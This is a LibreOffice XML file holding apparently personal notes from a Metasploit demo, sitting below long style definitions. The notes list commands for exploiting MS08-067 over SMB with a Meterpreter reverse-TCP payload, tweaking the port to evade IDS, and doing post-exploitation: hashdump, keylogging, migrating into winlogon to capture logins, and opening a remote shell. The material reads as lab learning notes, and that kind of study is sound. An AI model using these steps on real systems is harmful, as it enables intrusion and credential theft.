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9f31" officeooo:paragraph-rsid="00199f31"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00199f31" officeooo:paragraph-rsid="001a0442"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="001a0442" officeooo:paragraph-rsid="001a0442"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="001e3555" officeooo:paragraph-rsid="001e3555"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00207fe2" officeooo:paragraph-rsid="00207fe2"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0023884d" officeooo:paragraph-rsid="0023884d"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00259be8" officeooo:paragraph-rsid="00259be8"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="002761b8" officeooo:paragraph-rsid="002761b8"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001a0442"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="001a0ae1"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="001be4e8"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="001ee918"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="001ef1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f60a" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001a0ae1" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001d0403" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001ef13d" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="002576f0" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00289b3c" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00299c11" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="002a7daa" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="002c56f6" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="002e4743" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="002fad32" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0030ef88" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="003151a7" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties officeooo:rsid="0020082f"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties officeooo:rsid="0022c34b"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties officeooo:rsid="0023884d"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties officeooo:rsid="002576f0"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties officeooo:rsid="002761b8"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties officeooo:rsid="00289b3c"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties officeooo:rsid="00299c11"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties officeooo:rsid="002a7daa"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties officeooo:rsid="002c56f6"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties officeooo:rsid="002e4743"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties officeooo:rsid="002fad32"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties officeooo:rsid="0030a80b"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties officeooo:rsid="0030ef88"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties officeooo:rsid="00314256"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties officeooo:rsid="003151a7"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties officeooo:rsid="00323b15"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties officeooo:rsid="00328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rom Demo</text:h>
      <text:p text:style-name="P2">Start <text:span text:style-name="T1">postgres</text:span>:, <text:span text:style-name="T1">MSF uses postgres as it’s database.</text:span></text:p>
      <text:p text:style-name="P1"><text:tab/><text:span text:style-name="T6">sudo systemctl start postgresql</text:span></text:p>
      <text:p text:style-name="P1">Start Metasploit Framework DB. <text:s/><text:span text:style-name="T2">Only run init first time (must populate the DB I guess).</text:span></text:p>
      <text:p text:style-name="P1"><text:tab/><text:span text:style-name="T7">sudo </text:span><text:span text:style-name="T6">msfdb init</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T2">After </text:span><text:span text:style-name="T3">first time</text:span><text:span text:style-name="T2">, run</text:span></text:p>
      <text:p text:style-name="P1"><text:tab/><text:span text:style-name="T7">sudo </text:span><text:span text:style-name="T8">msfdb start</text:span></text:p>
      <text:p text:style-name="P3">Start Metasploit console:</text:p>
      <text:p text:style-name="P3"><text:tab/><text:span text:style-name="T9">sudo </text:span><text:span text:style-name="T6">msfconsole</text:span></text:p>
      <text:p text:style-name="P4">Search MSF database (smb in this example):</text:p>
      <text:p text:style-name="P4"><text:tab/><text:span text:style-name="T6">search smb</text:span></text:p>
      <text:p text:style-name="P4">Zero in on one exploit (most famous at this time)</text:p>
      <text:p text:style-name="P4"><text:tab/><text:span text:style-name="T6">search ms08_067_netapi</text:span></text:p>
      <text:p text:style-name="P4">Get more info for that exploit</text:p>
      <text:p text:style-name="P4"><text:tab/><text:span text:style-name="T6">info exploit/windows/smb/ms08_067_netapi</text:span></text:p>
      <text:p text:style-name="P4">Use the exploit</text:p>
      <text:p text:style-name="P4"><text:tab/><text:span text:style-name="T6">use exploit/windows/smb/ms08_067_netapi</text:span></text:p>
      <text:p text:style-name="P4">Now, need a payload for the exploit. <text:s/><text:span text:style-name="T20">This particular one opens a connection from the victim machine back to us so it’s better than us trying to make a connection to it since that would be flagged by IDS, IPS, Firewalls.</text:span></text:p>
      <text:p text:style-name="P4"><text:tab/><text:span text:style-name="T6">show payloads</text:span> <text:s/>(shows all payloads for the exploit)</text:p>
      <text:p text:style-name="P4"><text:tab/><text:span text:style-name="T6">search windows/meterpreter/reverse_tcp </text:span>(shows info on a specific payload</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>note without the “payload” in front of the path.)</text:p>
      <text:p text:style-name="P4"><text:tab/><text:span text:style-name="T6">info windows/meterpreter/reverse_tcp</text:span> <text:span text:style-name="T4">(Gets more info on the payload)</text:span></text:p>
      <text:p text:style-name="P4"><text:tab/><text:span text:style-name="T10">set payload info windows/meterpreter/reverse_tcp</text:span><text:span text:style-name="T5"> (Use the payload)</text:span></text:p>
      <text:p text:style-name="P5">Configure the exploit</text:p>
      <text:p text:style-name="P5"><text:tab/><text:span text:style-name="T6">show options</text:span> (not sure what this does) *********</text:p>
      <text:p text:style-name="P5"><text:tab/><text:span text:style-name="T6">show targets</text:span> (shows all targets this exploit works for)</text:p>
      <text:p text:style-name="P5"><text:tab/><text:span text:style-name="T21">Based on nmap for host OS, can use target “2” or keep it at “0” will work too</text:span></text:p>
      <text:p text:style-name="P5"><text:tab/><text:span text:style-name="T22">Showing options again shows the exploit, payload, and exploit target</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P6"><text:soft-page-break/>Set the remote (victim) and local host (machine for exploit to connect to.</text:p>
      <text:p text:style-name="P6"><text:tab/><text:span text:style-name="T6">set rhost 192.168.1.105</text:span></text:p>
      <text:p text:style-name="P6"><text:tab/><text:span text:style-name="T6">set lhost 10.0.2.15</text:span></text:p>
      <text:p text:style-name="P5">** <text:span text:style-name="T23">Change local port from 4444 since IDS usually know about Metasploit default port</text:span></text:p>
      <text:p text:style-name="P4"><text:tab/><text:span text:style-name="T11">set lport 4445</text:span></text:p>
      <text:p text:style-name="P7">Execute the exploit:</text:p>
      <text:p text:style-name="P7"><text:tab/><text:span text:style-name="T6">exploit</text:span></text:p>
      <text:p text:style-name="P7"><text:tab/>At this point if it’s successful, own the target box</text:p>
      <text:p text:style-name="P7"><text:tab/><text:span text:style-name="T24">Opens up meterpreter cmd prompt</text:span></text:p>
      <text:p text:style-name="P8">At <text:s/>meterpreter prompt</text:p>
      <text:p text:style-name="P8"><text:tab/><text:span text:style-name="T6">help</text:span> (gives what can be done on the target machine)</text:p>
      <text:p text:style-name="P8"><text:tab/><text:span text:style-name="T12">sysinfo</text:span><text:span text:style-name="T25"> (gives info about target machine line OS, Domain, # logged in users, etc</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:span text:style-name="T13">hashdump</text:span><text:span text:style-name="T26"> (gives user and pwd can use in brute force, dictionary, or rainbow attack)</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:span text:style-name="T14">idletime</text:span><text:span text:style-name="T27"> (time since there has been hands-on keyboard since compromised time)</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:span text:style-name="T28">Can be useful if should try anything now or wait a while</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:span text:style-name="T15">ps</text:span><text:span text:style-name="T28"> (list of every running process)</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:span text:style-name="T15">kill &lt;PID&gt;</text:span><text:span text:style-name="T28"> (kills process with PID)</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:span text:style-name="T16">migrate &lt;PID&gt;</text:span><text:span text:style-name="T29"> (migrate the running payload into another process. <text:s/>For instance, on XP can <text:tab/><text:tab/>migrate into explorer.exe which is owned by the active user)</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:span text:style-name="T30">Now, can use </text:span><text:span text:style-name="T17">keyscan_start</text:span><text:span text:style-name="T30"> to key log</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:span text:style-name="T30">If wanted to know </text:span><text:span text:style-name="T31">user’s</text:span><text:span text:style-name="T30"> login info, can migrate to winlogin process.</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:tab/><text:span text:style-name="T31">Capture login creds of every user that logs in</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/>*** <text:span text:style-name="T31">Once the box is rebooted, we loose the Meterpreter session ***</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:span text:style-name="T33">Can do things like capture login into web sites, etc.</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:span text:style-name="T18">keyscan_dump</text:span><text:span text:style-name="T32"> (shows all keystrokes)</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:span text:style-name="T19">keyscan_stop</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:span text:style-name="T19">shell</text:span><text:span text:style-name="T34"> (Opens Windows cmd prompt into meterpreter prompt)</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:span text:style-name="T34">Can execute windows commands</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:span text:style-name="T35">For instance, running ping will actually send pings from the victim’s box</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:span text:style-name="T36">Make and delete files and dirs</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:soft-page-break/>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3:48:19.481663046</meta:creation-date>
    <meta:generator>LibreOffice/7.0.4.2$Linux_X86_64 LibreOffice_project/00$Build-2</meta:generator>
    <dc:date>2025-08-01T06:59:50.661692681</dc:date>
    <meta:editing-duration>PT1H23M59S</meta:editing-duration>
    <meta:editing-cycles>31</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="59" meta:word-count="447" meta:character-count="2791" meta:non-whitespace-character-count="2335"/>
  </office:meta>
</office:document-meta>
</file>